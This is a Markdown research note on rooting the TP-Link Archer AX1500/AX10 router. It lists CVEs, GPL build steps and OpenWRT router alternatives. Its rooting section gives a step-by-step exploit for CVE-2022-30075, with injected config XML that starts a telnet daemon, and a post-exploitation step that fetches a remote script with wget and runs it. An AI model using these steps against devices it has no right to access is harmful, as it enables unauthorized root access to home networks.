# TP-Link Archer AX1500/AX10 Research

Complete research on TP-Link Archer AX1500 (AX10) router, OpenWRT compatibility, exploits, and alternatives.

## Quick Summary

| Aspect | Status |
|--------|--------|
| **Official OpenWRT** | ❌ Not supported |
| **Reason** | Broadcom chipset |
| **Stock Firmware** | Modified OpenWRT (locked) |
| **GPL Sources** | ✅ Available |
| **Root Access** | ✅ Via CVE exploits |
| **Recommended Alternative** | MediaTek Filogic routers |

---

## Hardware Specifications

| Component | Specification |
|-----------|--------------|
| **Model** | TP-Link Archer AX1500 / AX10 |
| **SoC** | Broadcom (ARM Cortex-A7) |
| **RAM** | 256MB (estimated) |
| **Flash** | 16-32MB |
| **WiFi** | AX1500 Wi-Fi 6 (2.4GHz + 5GHz) |
| **Ports** | 1x WAN, 4x LAN (Gigabit) |
| **USB** | 1x USB 2.0 |

---

## Known Vulnerabilities (CVEs)

### CVE-2022-30075 (WPS Button Exploit)

**Severity:** High  
**Status:** Patched in firmware ≥ July 2022

**Exploit Method:**
1. Download firmware v1.3.1 or earlier (unpatched)
2. Modify configuration XML
3. Upload modified config
4. Press WPS button → telnet daemon starts

**Requirements:**
- Firmware version < July 2022
- LAN access
- Admin password

### CVE-2022-40486 (XML Config Injection)

**Severity:** High  
**Status:** Patched in firmware ≥ v221103 (Nov 2022)

**Exploit Method:**
- Modified XML configuration injection
- Similar to CVE-2022-30075 but different vector

### CVE-2025-9961 (CWMP Stack Overflow) ⚠️ NEW

**Severity:** Critical (9.8 CVSS estimated)  
**Published:** September 2025

**Details:**
- **Type:** Stack-based buffer overflow in CWMP binary
- **Affected:** AX10, AX1500 series
- **Access:** Authenticated LAN attacker
- **Impact:** Remote code execution as root
- **Patched:** Firmware after June 2025

**Exploit Overview:**
```
Attacker → LAN → Authenticated → CWMP binary → Stack overflow → Root shell
```

**TP-Link Statement:**
> "An authenticated attacker may remotely execute arbitrary code via the CWMP binary on the devices AX10 and AX1500 series."

---

## Rooting Methods

### Method 1: CVE-2022-30075 (WPS Button)

**Prerequisites:**
- Firmware version before July 2022 (v1.3.1 recommended)
- Python 3.9
- Admin password

**Steps:**

```bash
# 1. Clone exploit repository
git clone https://github.com/aaronsvk/CVE-2022-30075.git
cd CVE-2022-30075

# 2. Install dependencies
pip install requests pycryptodome

# 3. Download router configuration
python tplink.py -b -t 192.168.0.1 -p your_admin_password

# 4. Modify configuration XML
# Edit: <config_dir>/ori-backup-user-config.xml

# Add WPS exploit button:
<button name="exploit">
  <action>released</action>
  <max>1999</max>
  <handler>/usr/sbin/telnetd -l /bin/login.sh</handler>
  <min>0</min>
  <button>wifi</button>
</button>

# Add DDNS exploit service:
<service name="exploit">
  <ip_script>/usr/sbin/telnetd -l /bin/login.sh</ip_script>
  <username>X</username>
  <password>X</password>
  <interface>internet</interface>
  <enabled>on</enabled>
  <domain>x.example.org</domain>
  <ip_source>script</ip_source>
  <update_url>http://127.0.0.1/</update_url>
</service>

# 5. Upload modified configuration
python tplink.py -t 192.168.0.1 -p your_password -r <config_dir>

# 6. Press WPS button on router

# 7. Connect via telnet
telnet 192.168.0.1
# Login: root (no password on some versions)
```

**Post-Exploitation:**
```bash
# Check root
whoami  # Should return: root

# Persistent access (runs from RAM)
cd /tmp
wget http://your-server/script.sh
chmod +x script.sh
./script.sh

# Kill telnet when done (security)
killall -9 telnetd
```

### Method 2: UART Serial Console

**Hardware Required:**
- USB to UART adapter (CP2102, FTDI, etc.)
- Soldering iron
- Pinout diagram

**Connection:**
```
Router UART  →  USB Adapter
TX           →  RX
RX           →  TX
GND          →  GND
VCC          →  (Not connected)
```

**Settings:**
- Baud rate: 115200
- Data: 8
- Parity: None
- Stop: 1
- Flow control: None

**Access:**
```bash
# Connect with minicom/puTTY
minicom -D /dev/ttyUSB0 -b 115200

# Or with screen
screen /dev/ttyUSB0 115200
```

**Limitations:**
- Drops to login prompt
- Requires credentials
- Doesn't provide root directly

### Method 3: CVE-2025-9961 (CWMP Exploit)

**Status:** New vulnerability (2025)  
**Requirements:**
- LAN access
- Valid router credentials
- Unpatched firmware

**Note:** Full exploit code not publicly available yet. Research ongoing.

---

## OpenWRT Compatibility

### Why No Official Support?

1. **Broadcom Chipset**
   - Closed-source WiFi drivers
   - Broadcom doesn't release open-source drivers
   - OpenWRT community doesn't support Broadcom WiFi

2. **Limited Flash Storage**
   - 16-32MB flash
   - OpenWRT needs 8-16MB minimum
   - No space for packages

3. **Low Community Interest**
   - Developers avoid Broadcom devices
   - Better alternatives available
   - Not worth development effort

4. **Stock Firmware**
   - Based on modified OpenWRT
   - Heavily locked down
   - Read-only filesystem

### What GPL Sources Provide

TP-Link releases GPL source code containing:
- Linux kernel sources
- OpenWRT SDK (modified)
- Some userspace packages

**Uses:**
- Build custom packages for router
- Compile kernel modules
- Study TP-Link's modifications
- Create static binaries (armv7)

**Limitations:**
- Can't build full flashable firmware
- No WiFi driver sources
- Proprietary components included

---

## Working with GPL Sources

### Build Environment

```bash
# Use Docker (Ubuntu 12.04 required)
docker build -t router_build .
docker run -it -v /path/to/sources:/router router_build

# Inside container
cd /router
patch -p1 < router.patch
make menuconfig
make SHELL=/bin/bash V=s
```

### Building Packages

```bash
# Userspace package
make package/<package_name>/compile V=s

# Kernel module
make package/<kernel_module>/compile V=s

# Output location
bin/<target>/packages/
```

### Installing on Router

```bash
# Download to router (from HTTP server)
wget http://192.168.0.2/package.ipk -O /tmp/package.ipk

# Install with workarounds
mkdir -p /tmp/var/lock
opkg install /tmp/package.ipk -o /tmp --force-space --nodeps

# Load kernel module
insmod /tmp/module.ko

# Run userspace binary
/tmp/binary &
```

---

## Recommended OpenWRT Routers (2025-2026)

### Why MediaTek Filogic?

1. **Open-source drivers** - MediaTek provides open WiFi drivers
2. **Official OpenWRT support** - All models in downloads.openwrt.org
3. **Active development** - MediaTek employees contribute to OpenWRT
4. **Great performance** - Excellent WireGuard/VPN speeds

### Budget Segment (MT7981 / Filogic 820)

| Router | RAM | ROM | WiFi | Price | Notes |
|--------|-----|-----|------|-------|-------|
| **Xiaomi AX3000T** | 256MB | 128MB | 3000Mbps | $35-50 | Best budget option |
| **Routerich AX3000** | 256MB | 128MB | 3000Mbps | $45-55 | OpenWRT pre-installed |
| **GL.iNet Beryl AX** | 512MB | 256MB | 3000Mbps | $90-110 | Travel router, USB-C, USB 3.0 |

**Performance (Filogic 820):**
- WireGuard: 525 Mb/s
- VLESS+XTLS: 250 Mb/s
- OpenConnect: 60 Mb/s
- WiFi Max (160 MHz): 1.18 Gb/s

### Flagship Segment (MT7986 / Filogic 830)

| Router | RAM | ROM | WiFi | Price | Notes |
|--------|-----|-----|------|-------|-------|
| **Xiaomi Redmi AX6000** | 512MB | 128MB | 6000Mbps | $60-100 | Best value flagship |
| **Mercusys MR90X V1** | 512MB | 128MB | 6000Mbps | $80-120 | 2.5GbE port |
| **Asus TUF-AX4200** | 512MB | 256MB | 4200Mbps | $130-140 | USB 3.0, 2.5GbE |
| **Asus RT-AX59U** | 512MB | 128MB | 5900Mbps | $100-110 | 2x USB ports |
| **GL.iNet Flint 2** | 1GB | 8GB | 6000Mbps | $165 | 2x 2.5GbE, USB 3.0 |
| **Banana Pi BPI-R3** | 2GB | 8GB | - | $100-140 | SFP, NVMe, enthusiast |

**Performance (Filogic 830):**
- WireGuard: 1.42 Gb/s
- VLESS+XTLS: >400 Mb/s
- OpenVPN: 110 Mb/s
- OpenConnect: 130 Mb/s
- WiFi Max (160 MHz): 1.55 Gb/s

---

## Known Issues: Filogic WAN Port Dropping

**Problem:** All MediaTek Filogic routers may experience intermittent `eth0: Link is Down` errors.

**Cause:** Bug in MT7531 switch driver.

**Fix:**
```bash
# Add to /etc/rc.local
ethtool -K eth0 tso off

# Or run manually
ethtool -K eth0 tso off
```

**Status:** Fixed in OpenWRT 24.x (snapshot builds)

---

## Future Research Directions

### For AX1500/AX10

1. **CVE-2025-9961 Exploitation**
   - Develop full exploit chain
   - Test on latest firmware
   - Document working versions

2. **Persistent Root Access**
   - Automate telnet startup
   - Modify init scripts
   - Create custom startup services

3. **Package Development**
   - Build useful static binaries
   - Create kernel modules
   - Optimize for limited RAM

4. **Network Security**
   - Firewall modifications
   - Traffic monitoring
   - VPN server/client

5. **Filesystem Modifications**
   - Writable overlay
   - Custom configurations
   - Backup/restore system

### For OpenWRT Migration

1. **U-Boot Modification**
   - Unlock bootloader
   - Custom recovery
   - Dual-boot setup

2. **Hardware Mods**
   - External flash chip
   - UART header installation
   - NAND dump/backup

---

## Security Warnings

⚠️ **Rooting your router:**
- Voids warranty
- May brick device
- Exposes network to attacks
- TP-Link won't provide support

⚠️ **After rooting:**
- Change all passwords
- Disable WAN access
- Update firewall rules
- Monitor for intrusions
- Kill telnet when not needed

⚠️ **CVE-2025-9961:**
- Patch your firmware if not using exploit
- Don't expose router admin to internet
- Use strong admin passwords
- Monitor LAN for suspicious activity

---

## Resources

### Official Links
- [TP-Link GPL Sources](https://www.tp-link.com/us/support/gpl-code/)
- [Archer AX1500 Firmware](https://www.tp-link.com/us/support/download/archer-ax1500/)
- [TP-Link Security Advisories](https://www.tp-link.com/us/support/security-advisory/)

### Exploit Repositories
- [CVE-2022-30075 PoC](https://github.com/aaronsvk/CVE-2022-30075)
- [TPLlAX1500GPL](https://github.com/Waujito/TPLlAX1500GPL) - Your GPL build utils
- [Archer AX10 Research](https://github.com/gscamelo/TP-Link-Archer-AX10-V1)

### Community
- [OpenWRT Forum - AX1500](https://forum.openwrt.org/t/tp-link-archer-ax1500-70-802-11ax-router-support/48781)
- [OpenWRT ToH - TP-Link](https://openwrt.org/toh/hwdata/tp-link/start)
- [OpenWRT SDK Guide](https://openwrt.org/docs/guide-developer/toolchain/using_the_sdk)

###CVE Databases
- [CVE-2025-9961](https://github.com/advisories/GHSA-mrm5-v7mh-6mmq)
- [CVE-2022-30075](https://nvd.nist.gov/vuln/detail/CVE-2022-30075)
- [CVE-2022-40486](https://nvd.nist.gov/vuln/detail/CVE-2022-40486)

---

## Conclusion

**AX1500/AX10 Current State:**
- ✅ Rootable via multiple CVEs
- ✅ GPL sources available
- ❌ No OpenWRT support
- ❌ Broadcom limitations
- ⚠️ Security risks if exposed

**Recommendation:**
- Use for learning/research
- Don't use as primary router
- Consider MediaTek Filogic for production
- Great for experimenting with embedded Linux

**Best Alternatives:**
- Budget: Xiaomi AX3000T ($35-50)
- Mid-range: Xiaomi Redmi AX6000 ($60-100)
- Flagship: GL.iNet Flint 2 ($165)
